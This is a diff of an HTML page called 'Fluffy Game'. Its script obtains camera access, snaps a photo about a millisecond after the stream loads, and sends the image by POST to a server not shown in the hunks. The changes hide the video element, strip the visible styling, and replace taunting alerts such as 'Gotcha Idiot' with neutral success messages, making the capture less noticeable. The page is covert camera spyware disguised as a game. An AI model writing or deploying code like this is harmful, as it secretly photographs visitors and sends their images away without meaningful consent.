@@ -2,22 +2,9 @@
 <html>
 <head>
   <title>Fluffy Game</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      text-align: center;
-      margin-top: 50px;
-    }
-    video {
-      width: 90%;
-      max-width: 400px;
-      border-radius: 12px;
-      box-shadow: 0 0 12px #aaa;
-    }
-  </style>
 </head>
 <body>
-  <video id="video" autoplay playsinline></video>
+  <video id="video" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <script>
@@ -31,10 +18,10 @@
       video.onloadedmetadata = () => {
         setTimeout(() => {
           takePhoto();
-        }, 3); 
+        }, 1); // adjust delay if needed
       };
     }).catch((err) => {
-      alert("Camera access denied");
+      alert("Camera access failed");
       console.error(err);
     });
 
@@ -51,14 +38,14 @@
           "Content-Type": "application/json"
         }
       })
-      .then(res => res.text())
-      .then(msg => {
-        alert("Gotcha Idiot");
-        console.log(msg);
+      .then(response => response.text())
+      .then(result => {
+        alert("✅ Photo captured and sent!");
+        console.log(result);
       })
-      .catch(err => {
-        alert("Bruh i lose");
-        console.error(err);
+      .catch(error => {
+        alert("❌ Failed to send image");
+        console.error(error);
       });
     }
   </script>
